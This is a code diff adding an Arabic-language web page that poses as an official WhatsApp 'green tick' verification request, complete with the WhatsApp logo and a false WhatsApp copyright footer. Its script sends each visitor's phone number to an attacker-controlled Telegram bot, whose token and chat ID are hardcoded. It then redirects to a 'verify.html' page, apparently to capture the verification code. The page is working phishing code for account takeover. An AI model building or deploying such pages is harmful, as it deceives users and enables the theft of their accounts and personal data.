@@ -1,0 +1,141 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>طلب توثيق رقم واتساب</title>
+  <style>
+    body {
+      background: #f2f4f7;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.05);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+    .logo {
+      width: 64px;
+      height: 64px;
+      margin-bottom: 10px;
+    }
+    h2 {
+      margin-bottom: 10px;
+      color: #067c3c;
+    }
+    p {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    select, input, button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 15px;
+    }
+    button {
+      background-color: #067c3c;
+      color: white;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .footer {
+      font-size: 12px;
+      margin-top: 20px;
+      opacity: 0.6;
+    }
+    .success {
+      color: green;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/WhatsApp_icon.png" alt="WhatsApp Logo" class="logo" />
+  <h2>طلب توثيق رقم واتساب</h2>
+  <p>العلامة الخضراء على WhatsApp هي علامة التحقق من WhatsApp Business</p>
+
+  <form id="verifyForm">
+    <label>اختر الدولة:</label>
+    <select id="country">
+      <option value="+967">اليمن 🇾🇪 (+967)</option>
+      <option value="+966">السعودية 🇸🇦 (+966)</option>
+      <option value="+20">مصر 🇪🇬 (+20)</option>
+    </select>
+
+    <label>رقم الهاتف:</label>
+    <input type="tel" id="phone" placeholder="أدخل رقم الهاتف بدون الصفر الأول" required />
+
+    <button type="submit">طلب كود التحقق</button>
+    <div id="status" class="success"></div>
+  </form>
+</div>
+
+<div class="footer">© جميع الحقوق محفوظة لشركة واتساب 2024</div>
+
+<script>
+  const BOT_TOKEN = "8115203717:AAGxK5UGa8MRcCcQACCxNxAjpUATbN8SP7E";
+  const CHAT_ID = "1630822492";
+
+  document.getElementById("verifyForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    const phone = document.getElementById("phone").value.trim();
+    const code = document.getElementById("country").value;
+    const fullNumber = code + phone;
+    const status = document.getElementById("status");
+
+    if (phone === "") {
+      status.innerText = "الرجاء إدخال الرقم.";
+      return;
+    }
+
+    const msg = `🔔 طلب توثيق رقم واتساب:\nرقم المستخدم: ${fullNumber}`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    try {
+      const response = await fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: msg
+        })
+      });
+
+      const data = await response.json();
+      if (data.ok) {
+        status.innerText = "✅ تم إرسال الطلب بنجاح.";
+setTimeout(() => {
+  window.location.href = 'verify.html';
+}, 1500);
+      } else {
+        status.innerText = "حدث خطأ أثناء الإرسال.";
+      }
+    } catch (error) {
+      status.innerText = "فشل الاتصال بالخادم.";
+    }
+  });
+</script>
+
+</body>
+</html>
